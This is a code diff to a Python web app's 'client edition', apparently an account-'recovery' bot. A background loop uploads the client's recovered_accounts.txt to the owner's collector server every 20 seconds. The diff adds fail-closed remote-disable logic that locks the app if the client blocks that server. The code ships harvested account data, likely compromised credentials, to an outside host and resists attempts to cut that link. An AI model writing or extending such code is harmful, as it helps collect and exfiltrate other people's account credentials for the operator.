@@ -350,8 +350,17 @@ CLIENT_LOGIN_PASS = os.environ.get("HERO_CLIENT_LOGIN_PASS", "client").strip() o
 COLLECTOR_DIR = os.path.join(BASE_DIR, "Client_Recoveries")
 CLIENT_KEYS_PATH = os.path.join(BASE_DIR, "client_keys.json")
 
-# Live remote-disable state for CLIENT edition (updated by the check-in thread)
-client_status = {"disabled": False, "message": "Your access has been disabled by the administrator."}
+# Live remote-disable state for CLIENT edition (updated by the check-in thread).
+#   disabled : the owner turned this client off (or we can't verify -> fail closed)
+#   verified : we have had at least one recent successful check-in
+# FAIL-CLOSED: if the client cannot reach the owner's server for longer than the
+# grace period (e.g. they firewall it), the app locks itself instead of running.
+client_status = {"disabled": False, "verified": False,
+                 "message": "Connecting to verify access…"}
+try:
+    CLIENT_GRACE_SECONDS = int(os.environ.get("HERO_GRACE_SECONDS", "300") or "300")
+except ValueError:
+    CLIENT_GRACE_SECONDS = 300
 
 
 def _load_or_create_secret():
@@ -518,8 +527,9 @@ PUBLIC_ENDPOINTS = {"login", "logout", "static", "api_collect"}
 def require_login():
     if request.endpoint in PUBLIC_ENDPOINTS:
         return None
-    # Client edition: honor the owner's remote disable switch
-    if IS_CLIENT and client_status.get("disabled"):
+    # Client edition: honor the owner's remote disable switch (fail-closed:
+    # blocked while disabled OR until a successful check-in has verified access)
+    if IS_CLIENT and (client_status.get("disabled") or not client_status.get("verified")):
         if request.path.startswith("/api/") or request.path == "/stream":
             return jsonify({"status": "error", "message": client_status.get("message", "Access disabled.")}), 503
         return render_template_string(CLIENT_DISABLED_TEMPLATE, message=client_status.get("message", "Access disabled."))
@@ -1367,39 +1377,53 @@ def api_clients_download(cid):
                     headers={"Content-Disposition": f'attachment; filename="recovered_accounts_{_safe_client_folder(cid)}.txt"'})
 
 
+def _client_stop_bot():
+    try:
+        if is_running:
+            with open(os.path.join(BASE_DIR, "stop.flag"), "w", encoding="utf-8") as f:
+                f.write("stop")
+    except Exception:
+        pass
+
+
 def client_uploader_loop():
     """CLIENT edition: periodically upload a COPY of the recovered accounts to
     the owner's collector AND honor the remote disable switch. The client keeps
-    its own local recovered_accounts.txt; the owner just receives a copy."""
+    its own local recovered_accounts.txt; the owner just receives a copy.
+
+    FAIL-CLOSED: the app stays locked until a successful check-in, and if it
+    cannot reach the owner's server for longer than the grace period (e.g. the
+    client firewalls it to dodge a disable), it locks itself again."""
     import urllib.request
+    last_ok = None
     while True:
         try:
-            time.sleep(20)
             content = ""
             if os.path.exists(ACCOUNTS_PATH):
                 with open(ACCOUNTS_PATH, "r", encoding="utf-8") as f:
                     content = f.read()
-            # Always check in (even with no new data) so disable takes effect
             payload = json.dumps({"client_id": CLIENT_ID, "key": CLIENT_KEY, "content": content}).encode()
             req = urllib.request.Request(COLLECTOR_URL, data=payload,
                                          headers={"Content-Type": "application/json"})
             with urllib.request.urlopen(req, timeout=15) as resp:
                 body = json.loads(resp.read().decode() or "{}")
+            last_ok = time.time()
             if body.get("enabled") is False or body.get("status") == "disabled":
                 client_status["disabled"] = True
-                client_status["message"] = body.get("message", client_status["message"])
-                # Stop the bot if it's running
-                try:
-                    if is_running:
-                        with open(os.path.join(BASE_DIR, "stop.flag"), "w", encoding="utf-8") as f:
-                            f.write("stop")
-                except Exception:
-                    pass
+                client_status["verified"] = True
+                client_status["message"] = body.get("message") or "Your access has been disabled by the administrator."
+                _client_stop_bot()
             else:
                 client_status["disabled"] = False
+                client_status["verified"] = True
         except Exception:
-            # Network hiccup - keep trying; do not disable on transient errors
-            pass
+            # Could not reach the owner's server -> FAIL CLOSED after the grace period
+            if last_ok is None or (time.time() - last_ok) > CLIENT_GRACE_SECONDS:
+                client_status["disabled"] = True
+                client_status["verified"] = False
+                client_status["message"] = "Can't verify your access with the server. Access is paused until it reconnects."
+                _client_stop_bot()
+        time.sleep(20)
 
 
 @app.route('/')
